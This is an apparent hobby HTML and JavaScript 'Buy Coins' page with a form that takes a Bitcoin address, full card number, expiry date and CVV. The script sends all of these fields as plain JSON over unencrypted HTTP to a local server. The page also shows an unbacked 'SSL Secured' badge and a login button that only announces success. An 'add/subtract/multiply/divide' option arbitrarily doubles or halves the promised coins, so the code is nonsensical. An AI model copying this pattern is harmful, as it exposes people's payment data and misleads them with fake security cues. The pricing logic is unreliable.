<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buy Coins</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #c9d0d7;
            margin: 0;
            padding: 0;
        }

        .container {
            width: 80%;
            margin: auto;
            overflow: hidden;
        }

        header {
            background: #50b3a2;
            color: #333;
            padding: 20px;
            border-bottom: #50b3a2 3px solid;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        header h1 {
            margin: 0;
        }

        header img {
            width: 50px;
        }

        nav ul {
            list-style: none;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
        }

        nav ul li {
            margin-right: 20px;
        }

        nav ul li a {
            text-decoration: none;
            color: #333;
            font-weight: bold;
            transition: color 0.3s;
        }

        nav ul li a:hover {
            color: #50b3a2;
        }

        nav .auth {
            margin-left: auto;
        }

        nav .auth a {
            margin-left: 20px;
            color: #50b3a2;
        }

        main {
            padding: 20px;
            background: #efeeee;
            margin-top: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
        }

        form .form-group {
            margin-bottom: 15px;
        }

        form .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        .horizontal-group {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
        }

        .form-group input,
        .form-group select {
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
            width: 100%;
        }

        .form-group select {
            width: calc(100% - 22px);
        }

        .payment-methods {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .payment-methods img {
            width: 50px;
            margin-top: 10px;
        }

        button {
            background: #50b3a2;
            color: #fff;
            border: 0;
            padding: 10px 15px;
            cursor: pointer;
            border-radius: 4px;
            transition: background 0.3s;
            width: 100%;
            margin-top: 10px;
        }

        button:hover {
            background: #408a7b;
        }

        .result {
            background-color: #50b3a2;
            color: #fff;
            padding: 10px;
            border-radius: 5px;
            display: none;
            margin-top: 10px;
        }

        footer {
            background: #50b3a2;
            color: #fff;
            text-align: center;
            padding: 20px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <header class="container">
        <div class="logo">
            <img src="aaaaa.png" alt="Logo">
        </div>
        <h1>Buy Coins</h1>
        <div class="secure">
            <img src="ssl.png" alt="SSL Secured">
        </div>
        <nav>
            <ul>
                <li><a href="#home">Home</a></li>
                <li><a href="#buy">Buy</a></li>
                <li><a href="#sell">Sell</a></li>
                <li><a href="#faq">FAQ</a></li>
                <li><a href="#contact">Contact</a></li>
            </ul>
            <div class="auth">
                <a href="#login" id="loginBtn">Login</a>
                <a href="#logout" id="logoutBtn" style="display:none;">Logout</a>
            </div>
        </nav>
    </header>

    <main class="container">
        <h2>Secure Purchase</h2>
        <form id="coinForm">
            <div class="form-group">
                <label for="amount">Amount to Spend:</label>
                <input type="number" id="amount" name="amount" step="0.01" required>
            </div>

            <div class="form-group">
                <label for="currency">Currency:</label>
                <select id="currency" name="currency" required>
                    <option value="EUR">EUR (€)</option>
                    <option value="GBP">GBP (£)</option>
                    <option value="CAD">CAD (C$)</option>
                    <option value="USD">USD ($)</option>
                </select>
            </div>

            <div class="form-group">
                <label for="operation">Operation:</label>
                <select id="operation" name="operation" required>
                    <option value="add">Add</option>
                    <option value="subtract">Subtract</option>
                    <option value="multiply">Multiply</option>
                    <option value="divide">Divide</option>
                </select>
            </div>

            <div class="form-group">
                <label for="btcAddress">Receive Bitcoin Address:</label>
                <input type="text" id="btcAddress" name="btcAddress" required>
            </div>

            <div class="form-group">
                <label for="cardNumber">Card Number:</label>
                <input type="text" id="cardNumber" name="cardNumber" maxlength="16" required>
            </div>

            <div class="form-group horizontal-group">
                <div>
                    <label for="expiryDate">Expiry Date:</label>
                    <input type="month" id="expiryDate" name="expiryDate" required>
                </div>
                <div>
                    <label for="cvv">CVV:</label>
                    <input type="text" id="cvv" name="cvv" maxlength="3" required>
                </div>
            </div>

            <div class="payment-methods">
                <img src="visa.png" alt="Visa">
                <img src="debit2.png" alt="Debit">
                <img src="mastercard.png" alt="MasterCard">
            </div>

            <button type="submit">Submit</button>
        </form>
        <p id="result" class="result"></p>
    </main>

    <footer>
        <p>&copy; 2024 Buy Coins. All rights reserved.</p>
    </footer>

    <script>
        const currencyValues = {
            EUR: 63774.29,
            GBP: 54418.87,
            CAD: 94402.10,
            USD: 69127.90
        };

        document.getElementById('loginBtn').addEventListener('click', function() {
            alert('Logged in successfully!');
            this.style.display = 'none';
            document.getElementById('logoutBtn').style.display = 'inline';
        });

        document.getElementById('logoutBtn').addEventListener('click', function() {
            alert('Logged out successfully!');
            this.style.display = 'none';
            document.getElementById('loginBtn').style.display = 'inline';
        });

        document.getElementById('coinForm').addEventListener('submit', function(event) {
            event.preventDefault();
            performOperation();
        });

        function performOperation() {
            const amount = parseFloat(document.getElementById('amount').value);
            const currency = document.getElementById('currency').value;
            const operation = document.getElementById('operation').value;
            const btcAddress = document.getElementById('btcAddress').value;
            const cardNumber = document.getElementById('cardNumber').value;
            const expiryDate = document.getElementById('expiryDate').value;
            const cvv = document.getElementById('cvv').value;

            if (isNaN(amount) || amount <= 0) {
                alert("Please enter a valid amount.");
                return;
            }

            if (cardNumber.length !== 16 || cvv.length !== 3) {
                alert("Please enter valid card details.");
                return;
            }

            const currencyValue = currencyValues[currency];
            let btcAmount = amount / currencyValue;

            switch (operation) {
                case 'add':
                    btcAmount += btcAmount;
                    break;
                case 'subtract':
                    btcAmount -= btcAmount / 2;
                    break;
                case 'multiply':
                    btcAmount *= 2;
                    break;
                case 'divide':
                    btcAmount /= 2;
                    break;
                default:
                    alert("Invalid operation selected.");
                    return;
            }

            const resultElement = document.getElementById('result');
            resultElement.innerText = `You will receive ${btcAmount.toFixed(8)} BTC at the address: ${btcAddress}`;
            resultElement.style.display = 'block';

            const purchaseData = {
                amount,
                currency,
                operation,
                btcAddress,
                cardNumber,
                expiryDate,
                cvv
            };

            fetch('http://localhost:3000/purchase', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(purchaseData)
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('result').innerText = data;
                document.getElementById('result').style.display = 'block';
            })
            .catch(error => {
                alert('Error: ' + error.message);
            });
        }
    </script>
</body>
</html>
